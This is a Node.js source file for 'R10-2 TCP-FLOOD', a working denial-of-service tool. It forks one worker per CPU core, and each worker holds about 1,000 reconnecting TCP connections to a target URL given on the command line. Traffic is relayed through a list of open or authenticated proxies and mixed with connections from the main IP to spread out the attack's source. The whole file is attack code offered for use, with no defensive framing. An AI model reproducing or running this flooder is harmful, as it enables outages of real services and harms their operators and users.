// R10-2: TCP-FLOOD - Raw TCP Connection Flood
// Focus: Overwhelm network stack
// Technique: Raw TCP connections with minimal data
// Updated: Support authenticated proxies

const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];

// Parse proxy line - supports both formats: host:port and host:port:username:password
function parseProxy(proxyLine) {
    const parts = proxyLine.split(':');
    if (parts.length === 4) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            username: parts[2],
            password: parts[3],
            auth: true
        };
    } else if (parts.length >= 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            auth: false
        };
    }
    return null;
}

// Load proxies
try {
    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    
    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
    console.log(`[R10-2] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
} catch (e) {
    console.log('[R10-2] No proxy.txt found, running without proxies');
}

const USE_MAIN_IP = true;
const MIX_RATIO = 0.3;

function shouldUseMainIp() {
    return USE_MAIN_IP && Math.random() < MIX_RATIO;
}

if (cluster.isMaster) {
    console.log(`[R10-2] TCP-FLOOD launching on ${CPU_CORES} cores`);
    console.log(`[R10-2] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    const parsed = new URL(target);
    
    let connections = 0;
    let mainIpCount = 0;
    let proxyCount = 0;
    
    function createDirectConnection() {
        const socket = net.connect(parsed.port || 80, parsed.hostname, () => {
            connections++;
            mainIpCount++;
            socket.write(`GET / HTTP/1.1\r\nHost: ${parsed.hostname}\r\n\r\n`);
        });
        
        socket.on('error', () => {
            connections--;
        });
        
        socket.on('close', () => {
            connections--;
            setTimeout(() => createDirectConnection(), 100);
        });
    }
    
    function createProxiedConnection(proxy) {
        const socket = net.connect(proxy.port, proxy.host, () => {
            let connectReq = `CONNECT ${parsed.hostname}:${parsed.port || 80} HTTP/1.1\r\nHost: ${parsed.hostname}:${parsed.port || 80}\r\n`;
            
            if (proxy.auth) {
                const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
            }
            
            connectReq += '\r\n';
            socket.write(connectReq);
            
            socket.once('data', () => {
                connections++;
                proxyCount++;
                socket.write(`GET / HTTP/1.1\r\nHost: ${parsed.hostname}\r\n\r\n`);
            });
        });
        
        socket.on('error', () => {
            connections--;
            setTimeout(() => createProxiedConnection(proxy), 1000);
        });
        
        socket.on('close', () => {
            connections--;
            setTimeout(() => createProxiedConnection(proxy), 100);
        });
    }
    
    // Create connection pool
    for (let i = 0; i < 1000; i++) {
        if (shouldUseMainIp() || proxies.length === 0) {
            createDirectConnection();
        } else {
            const proxy = proxies[i % proxies.length];
            createProxiedConnection(proxy);
        }
    }
    
    setInterval(() => {
        console.log(`[R10-2] Connections: ${connections} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
    }, 1000);
    
    setTimeout(() => process.exit(0), time * 1000);
}